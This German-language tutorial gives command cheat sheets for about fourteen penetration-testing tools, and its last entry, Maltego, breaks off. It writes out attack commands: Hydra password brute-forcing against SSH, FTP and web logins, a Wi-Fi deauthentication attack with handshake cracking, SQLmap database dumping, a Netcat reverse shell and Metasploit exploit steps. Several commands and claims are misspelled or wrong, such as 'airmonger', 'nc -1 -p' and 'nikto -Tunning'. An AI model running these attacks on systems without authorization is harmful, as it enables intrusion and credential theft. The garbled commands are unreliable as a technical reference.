Willkommen zu den Tutorials

Das ist der Abschnitt m it den Tutorials zu den 15 most basic tools mit Commands und befehlen

  1. Nmap (Network Mapper)

    Nmap ist ein leistungsstarkes Tool zur Netzwerkerkundung und Sicherheitsüberprüfung. Es hilft, offene Ports, laufende Dienste und sogar Betriebssysteme zu identifizieren.

    • Der Basic Scan, Scaned die angegebene IP und listst die offenen Ports: nmap |Ziel IP|
    • Der Zusatzt -O veranlasst das Nmap auch das Betriebssystem des angegebenen Ziels Abfragt: nmap -O |Ziel IP|
    • Der Zusatzt -sV gibt die Servies Version des Ausführenden Dienstes aus: nmap -sV |Ziel IP|
    • Beim Zustazt --script nutzt Nmap ein vorgefertigtes Script: nmap --script |scriptname| |Ziel IP|
    • Wenn man ein -A befügt detailierte informationen aus: nmap -A |Ziel IP|

    Es gibt einige weitere Funktionen eine Auskunft erhaltten sie mit "--help"

  2. Metasploite

    Metasploit ist ein Framework, das Exploits bereitstellt, um Schwachstellen in Systemen auszunutzen. Es ist ein essenzielles Werkzeug für Penetrationstester.

    • Um Metasploite zu starten führe: msfconsole
    • Als nächstes suche sie den Exploit den sie Suchen: search |Exploit Name|
    • Wählen sie nun Exploit aus den sie benutzen wollen: use |Exploit Name|
    • Setzten sie die Ziel : set RHOST |Ziel IP|
    • Starten sie den Exploit und führen sie den Angriff aus: exploit oder run

    Metasploit kann auch Payloads wie Reverse Shell erstellen und unterstützt Post-Exploitation-Techniken zur Kontrolle von kompromittierten Systemen.

  3. Wireshark

    Wireshark ist ein Netzwerkprotokoll-Analysetool, das Datenpakete in Echtzeit analysiert. Es hilft, Sicherheitslücken in Netzwerken zu erkennen.

    • Starten sie die graphische Benutzeroberfläche mit: wireshark
    • Wählen sie die Netzwerkschnittstelle aus die sie zu scannen benutzten wollen(z.B. eth0 oder wlan0)
    • (Optianal) Stellen sie einen Filtern ein wie "tcp" oder "http", dies macht das auswerten der Daten einfacher
    • Starten sie den Analyseprozess
    • Klicken sie auf das Paket welches sie genauer analysieren wollen

    WireSchark unterstüzt das exporttieren in verschieden Formaten und ist nützlich zum erkennen von MAn-in-the-Middle-Angriffen

  4. Hydra

    Hydra ist ein Brute-Force-Tool, um Passwörter für diverse Dienste wie SSH, FTP oder HTTP zu knacken.

    • Ein Brute-Force-Scan auf SSH mit einem festen Benutzernamen und Passwortliste: hydra -l admin -P passlist.txt |Ziel IP| ssh
    • Die Verwendung einer Benutzer- und Passwortliste für einen FTP-Brute-Force-Angriff: hydra -L userlist.txt -P passlist.txt |Ziel IP| ftp
    • Ein Angriff auf ein Webformular mithilfe einer HTTP-POST-Anfrage: hydra -l admin -P passlist.txt http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
    • Mit dem Zusatzt -t 4 legt man die Anzahl der parallelen Verbindungen auf 4 fest: hydra -t 4 -l admin -P passlist.txt |Ziel IP| ssh
    • Für Angriffe auf IPv6-Adressen kann der Zusatzt -6 verwendet werden: hydra -6 -l admin -P passlist.txt |Ziel IPv6-Adresse| ssh

    Hydra kann auch parallel arbeiten und mehere Protokolle unterstützt. Man sollte es nicht inflationär einsetzten da es auffält

  5. Aircrack-ng

    Ein Toolkit für WLAN-Sicherheitsanalysen, das Netzwerke scannen, Pakete abfangen und WEP/WPA-Schlüssel knacken kann.

    • Starten sie Aircrack-ng mit: aircrack-ng
    • Wähle eine Netztwerkkarte aus über die sie scannen wollen: airmonger start |Netzwerkschnittstelle|
    • Starten sie das Scannen: airodumg-ng |Netzwerkschnittstelle|mon
    • Fangen sie den handshake ab mit: airodump-ng -c |Kanal|
    • Knacken sie den Schlüssel mit einer PAsswortliste: aircrack-ng |Handshake-Datei| -w |Passwort-Liste|
    • Alternative könne sie auch einen Deauth Angriff fahren um schneller den handschacke abzufangen: aireplay-ng -0 10 -a |MAC-Adresse des Routers| wlan0mon

    Sie brauche eine Ausreichend kompatible Netztwerkkarte und ein ausreichend starkes signal und zeit für Angriffe auf WPA/WPA2

  6. John the Ripper

    John the Ripper ist ein Passwort-Cracking-Tool, das Hashes entschlüsseln kann. Es unterstützt zahlreiche Algorithmen wie MD5, SHA und mehr.

    • Starten sie John the Ripper mit: john
    • Knacken sie den Hash mit einer Passwortliste: john --wordlist |Passwort-Liste| |Hash|
    • Sie können John auch benutztnen um eine Hash zu identifizieren: john --list=formats |Hash|
    • Eine unbabsichtige abgebrochen Prozess könne sie wiederherstelln mit: john --restore
    • Wenn sie wissen wollen weit john ist könne sie den Status abfragen mit: john --status
    • In John sind auch Algorithmen zum generieren von wortlisten implementieret: john --incremental

    Beachten sie das John the Ripper für Multicore Cpus Optimiert ist und auch mit gpu-bassierten Cracking-tools kombiniert wertden kann

  7. SQLmap

    SQLmap automatisiert SQL-Injection-Angriffe, um Schwachstellen in Datenbanken zu identifizieren und auszunutzen.

    • Der Basis Scan wird mit : sqlmap -u |An zungreifende Url|
    • Der Zusatzt --dbs sorgt dafür das die Datenbanken werden ausgegeben: sqlmap -u |An zungreifende Url| --dbs
    • Wenn man -D |Datenbanken| --tables benutzt bekommt man die Tabellen der Datenbanken: sqlmap -u |An zungreifende Url| -D |Datenbanken| --tables
    • Eine eben tiefer kommt man mit dem Zusatzt -D |Datenbanken| -T |Tabelle| --dump: sqlmap -u |An zungreifende Url| -D |Datenbanken| -T |Tabelle| --dump
    • Die Benutzter rechte ruft man mit: |sqlmap -u |An zungreifende Url| --privileges

    Dieses Tools ist sehr gut geignet für Webanwendungen und automatisiert viele manuelle Schritte und spart Zeit

  8. Netcat

    Netcat ist ein vielseitiges Netzwerktool, das zur Datenübertragung, Portscans und als Backdoor eingesetzt werden kann.

    • Eine Portscan führt man mit: nc -zv |Ziel IP| |Ziel Port|
    • Um datein an eine bestimten port zusenden: nc |Ziel IP| |Ziel Port| |Datei.txt|
    • Um datein von bestimmten Port zu empfangen kann man: nc -1 -p |Ziel Port| > |Datei.txt|
    • Nachrichten kann man mit dem befehl nc -p |Ziel IP| |Nachricht| senden
    • Eine Reverse Shell fährt man mit : nc -e /bin/bash |Ziel IP| |Ziel Port|

    Netcat ist ideal für einfaqche Netzwerkoperationen, ist aber mit bedacht zu genießen da es leicht erkannt werden kann

  9. Nikto

    Nikto ist ein Web-Server-Scanner, der nach bekannten Schwachstellen sucht und Konfigurationsfehler aufdeckt.

    • Der Basis Scan wird mit : nikto -h |Ziel IP|
    • Port Scannen kann man mit: nikto -h |Ziel IP| -p |Port|
    • Protokolle kann man auf dem ziel mit: nikto -h |Ziel IP| -s |Protokoll|
    • Den Bericht von Nikto speichert mit: nikto -h |Ziel IP| -o |Datei.html|
    • Führe einen Spezifischen Tests aus: nikto -Tunning x

    Ist besonderst ist besonderst geignet für Webanwendungens Entwickler. Erkennen der Schwachstellen schnell, hatt aber keine Exploit-Funktionen

  10. Gobuster

    Gobuster ist ein Verzeichnis-Bruteforcing-Tool, das auf Webservern versteckte Verzeichnisse und Dateien aufspürt.

    • Verzeichnisse durchsuchen: gobuster dir -u http://example.com -w wordlist.txt
    • Subdomains finden: gobuster dns -d example.com -w subdomains.txt
    • Spezifische Dateitypen durchsuchen: gobuster dir -u http://example.com -w wordlist.txt -x php,html
    • Threads erhöhen: gobuster dir -u http://example.com -w wordlist.txt -t 50
    • Proxy nutzen: gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080

    Gobuster ist schneller als viele Alternativen, da es keine DNS-Abfragen macht. Perfekt für die Recon-Phase von Webanwendungen.

  11. Social Engineering Toolkit (SET)

    SET ist ein Framework für Social-Engineering-Angriffe wie Phishing oder Spear-Phishing.

    • Starten: setoolkit – Öffnet das Menü.
    • Option wählen: Wähle z. B. "Social-Engineering-Angriffe".
    • Angriffsart auswählen: Wähle zwischen Phishing, Credential Harvesting etc.
    • Payload erstellen: Nutze vorgefertigte Payloads.
    • Angriff starten: Folge den Anweisungen in SET.

    Besonders nützlich für Sicherheitsbewusstseins-Trainings. Extrem flexibel und mächtig.

  12. DNSenum

    DNSenum ist ein DNS-Reconnaissance-Tool, das Domainnamen und ihre Infrastruktur analysiert.

    • Basis-Scan: dnsenum example.com
    • Brute-Force mit DNS-Server: dnsenum --dnsserver <DNS> --enum example.com
    • Subdomains auflisten: dnsenum --enum example.com
    • WHOIS-Abfrage: dnsenum --whois example.com
    • Ergebnisse speichern: dnsenum example.com -o results.xml

    Effizient für die Recon-Phase. Erkennt DNS-Misconfigurations schnell.

  13. Responder

    Responder ist ein Tool, das NTLM-Hashes in Netzwerken abfängt und entschlüsselt.

    • Starten: responder -I eth0 – Lauscht auf dem Netzwerkinterface.
    • Hashes speichern: Fängt NTLMv2-Hashes ab und speichert sie.
    • Analyse: Ergebnisse mit cat öffnen oder für Cracking speichern.
    • Hashes entschlüsseln: Nutze Tools wie Hashcat.
    • Beenden: CTRL+C – Stoppt Responder.

    Besonders nützlich in internen Netzwerken. Funktioniert ohne zusätzliche Konfigurationen.

  14. Maltego

    Maltego ist ein Datenanalyse-Tool, das Beziehungen zwischen Personen, Domains und Netzwerken visualisiert.

    • Starten die Maltego GUI: maltego
    • Fügen sie eine Neue Entität: Füge domains, Ips oder Personen hinzu.
    • Führen sie einen Transform aus
    • Visualisieren sie die Ergebnisse
    • Exportieren sie das als png oder pdf
